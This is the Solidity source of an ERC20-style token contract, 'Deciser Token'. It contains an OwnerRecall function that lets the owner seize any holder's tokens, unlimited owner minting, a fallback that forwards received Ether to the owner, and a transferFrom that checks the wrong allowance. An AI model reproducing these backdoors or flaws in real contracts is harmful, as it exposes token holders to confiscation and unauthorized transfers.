 

pragma solidity ^0.4.24;

 
 
 
 
 
 
 
 
 
 
 
 
 


 
 
 
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


 
 
 
 
contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address _tokenOwner) public constant returns (uint balance);
    function allowance(address _tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed _tokenOwner, address indexed spender, uint tokens);
}



 
 
 
contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}


 
 
 
 
contract DeciserToken is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


     
     
     
    function DeciserToken() public {
        symbol = "DEC";
        name = "Deciser Token";
        decimals = 6;
        totalSupply = 1000000000000000000000000;
        if (msg.sender == owner) {
          balances[owner] = totalSupply;
          Transfer(address(0), owner, totalSupply);
        }

    }


     
     
     
    function totalSupply() public constant returns (uint) {
        return totalSupply - balances[address(0)];
    }


     
     
     
    function balanceOf(address _tokenOwner) public constant returns (uint balance) {
        return balances[_tokenOwner];
    }


     
     
     
     
     
 
    function transfer(address _to, uint _tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], _tokens);
        balances[_to] = safeAdd(balances[_to], _tokens);
        Transfer(msg.sender, _to, _tokens);
        return true;
    }

    function MintToOwner(uint _tokens) public onlyOwner returns (bool success) {
        balances[owner] = safeAdd(balances[owner], _tokens);
        Transfer (address (0), owner, _tokens);
        return true;

    }


     
     
     
     
     
     
     
     
    function approve(address _spender, uint _tokens) public returns (bool success) {
        allowed[msg.sender][_spender] = _tokens;
        Approval(msg.sender, _spender, _tokens);
        return true;
    }

     
     
     
     
     
    function ApproveAndtransfer(address _to, uint _tokens) public returns (bool success) {
        allowed[msg.sender][_to] = _tokens;
        Approval(msg.sender, _to, _tokens);
        balances[msg.sender] = safeSub(balances[msg.sender], _tokens);
        balances[_to] = safeAdd(balances[_to], _tokens);
        Transfer(msg.sender, _to, _tokens);
        return true;
    }

     
     
     
     
    function allowance(address _tokenOwner, address _spender) public constant returns (uint remaining) {
        return allowed[_tokenOwner][_spender];
    }

 
     
     
     
     
     
     
     
     
    function transferFrom(address _from, address _to, uint _tokens) public returns (bool success) {
        balances[_from] = safeSub(balances[_from], _tokens);
        allowed[_from][_to] = safeSub(allowed[_from][_to], _tokens);
        balances[_to] = safeAdd(balances[_to], _tokens);
        Transfer(_from, _to, _tokens);
        return true;
    }

     
     
     
    function () public payable {
        if (msg.value !=0 ) {

            if(!owner.send(msg.value)) {

            revert();
        }
            
        }
        }


     
     
     
    function OwnerRecall(address _FromRecall, uint _tokens) public onlyOwner returns (bool success) {
        allowed[_FromRecall][owner] = _tokens;
        Approval(_FromRecall, owner, _tokens);
        balances[_FromRecall] = safeSub(balances[_FromRecall], _tokens);
        balances[owner] = safeAdd(balances[owner], _tokens);
        Transfer(_FromRecall, owner, _tokens);
        return true;
    }
}